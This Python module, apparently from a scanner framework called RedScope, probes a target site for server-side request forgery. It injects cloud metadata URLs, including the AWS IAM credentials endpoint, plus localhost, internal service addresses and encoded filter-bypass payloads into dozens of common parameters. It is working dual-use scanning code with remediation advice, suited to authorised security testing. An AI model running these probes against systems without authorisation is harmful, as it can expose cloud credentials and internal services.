from typing import List, Optional
from urllib.parse import urlparse, parse_qs

import requests

from core.base_module import BaseModule, ScanResult, Finding

SSRF_PARAMS = [
    "url", "uri", "src", "source", "href", "link", "path", "file",
    "page", "host", "site", "to", "out", "redirect", "fetch", "load",
    "image", "img", "avatar", "photo", "icon", "resource", "proxy",
    "request", "endpoint", "api", "feed", "target", "dest", "webhook",
    "callback", "return", "data", "input", "remote", "location",
]

# Internal/cloud metadata targets
INTERNAL_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://localhost/", "Localhost"),
    ("http://0.0.0.0/", "Localhost (0.0.0.0)"),
    ("http://[::1]/", "IPv6 Localhost"),
    ("http://127.0.0.1:22/", "Internal SSH"),
    ("http://127.0.0.1:3306/", "Internal MySQL"),
    ("http://127.0.0.1:6379/", "Internal Redis"),
    ("http://127.0.0.1:9200/", "Internal Elasticsearch"),
    ("http://192.168.0.1/", "Internal Network Gateway"),
]

# Bypass payloads for filter evasion
BYPASS_PAYLOADS = [
    "http://2130706433/",           # 127.0.0.1 as decimal
    "http://0177.0.0.1/",          # 127.0.0.1 as octal
    "http://0x7f000001/",          # 127.0.0.1 as hex
    "http://127.1/",               # Short form
    "http://127.0.0.1.nip.io/",    # DNS rebinding via nip.io
    "http://localtest.me/",        # Resolves to 127.0.0.1
]

CLOUD_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",
    "computeMetadata", "metadata.google",
    "compute/v1", "instanceMetadata",
]


class Module(BaseModule):
    name = "ssrf"
    description = "SSRF detector — internal metadata, localhost, and cloud endpoint probing"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"SSRF scan on [bold]{url}[/]")

        existing_params = self._extract_params(url)
        base_url = url.split("?")[0] if existing_params else url
        params_to_test = set(existing_params) | set(SSRF_PARAMS)

        self.log.info(f"  Testing {len(params_to_test)} params × {len(INTERNAL_TARGETS)} targets")

        for param in params_to_test:
            # Test internal/cloud metadata targets
            for ssrf_url, label in INTERNAL_TARGETS:
                finding = self._probe(session, base_url, param, ssrf_url, label, timeout)
                if finding:
                    result.add_finding(finding)
                    break  # One confirmed finding per param is enough

            # Test bypass payloads
            for payload in BYPASS_PAYLOADS:
                finding = self._probe(session, base_url, param, payload, "Localhost bypass", timeout)
                if finding:
                    result.add_finding(finding)
                    break

        if not result.findings:
            self.log.info("[dim]No SSRF detected[/]")

        return result

    def _probe(self, session, base_url, param, ssrf_url, label, timeout) -> Optional[Finding]:
        try:
            resp = session.get(
                base_url,
                params={param: ssrf_url},
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )

            body = resp.text

            # Check for cloud metadata indicators in response
            for indicator in CLOUD_INDICATORS:
                if indicator.lower() in body.lower():
                    self.log.info(f"  [bold red]SSRF CONFIRMED[/] param={param} target={label}")
                    return Finding(
                        title=f"SSRF — Cloud Metadata Accessible via '{param}'",
                        severity="critical",
                        description=(
                            f"Server-Side Request Forgery confirmed. The parameter '{param}' "
                            f"caused the server to fetch {ssrf_url} ({label}), "
                            f"and the response contains cloud metadata content. "
                            f"This may expose AWS/GCP/Azure credentials and instance information."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"SSRF URL: {ssrf_url}\n"
                            f"Indicator found: '{indicator}'\n"
                            f"Response excerpt: {body[:300]}"
                        ),
                        remediation=(
                            "Validate and whitelist all URLs fetched server-side. "
                            "Block requests to 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. "
                            "Use a dedicated egress proxy with allowlist. "
                            "Disable IMDSv1 on AWS and require IMDSv2 with session tokens."
                        ),
                        tags=["ssrf", "cloud-metadata", "critical", "web"],
                    )

            # Heuristic: unusually fast response to internal target = may have connected
            if resp.elapsed.total_seconds() < 0.3 and resp.status_code == 200 and len(body) > 10:
                if "127.0.0.1" in ssrf_url or "localhost" in ssrf_url or "169.254" in ssrf_url:
                    self.log.info(f"  [yellow]SSRF POSSIBLE[/] param={param} target={label} (fast response, non-empty body)")
                    return Finding(
                        title=f"Possible SSRF — Fast Internal Response via '{param}'",
                        severity="high",
                        description=(
                            f"Parameter '{param}' with value '{ssrf_url}' returned an unusually "
                            f"fast non-empty response, suggesting the server may have reached an internal service."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"SSRF URL: {ssrf_url}\n"
                            f"Response time: {resp.elapsed.total_seconds():.3f}s\n"
                            f"Status: {resp.status_code}\n"
                            f"Body length: {len(body)} bytes"
                        ),
                        remediation=(
                            "Validate and whitelist all URLs fetched server-side. "
                            "Block private IP ranges at the network level."
                        ),
                        tags=["ssrf", "web", "heuristic"],
                    )

        except requests.RequestException:
            pass
        return None

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
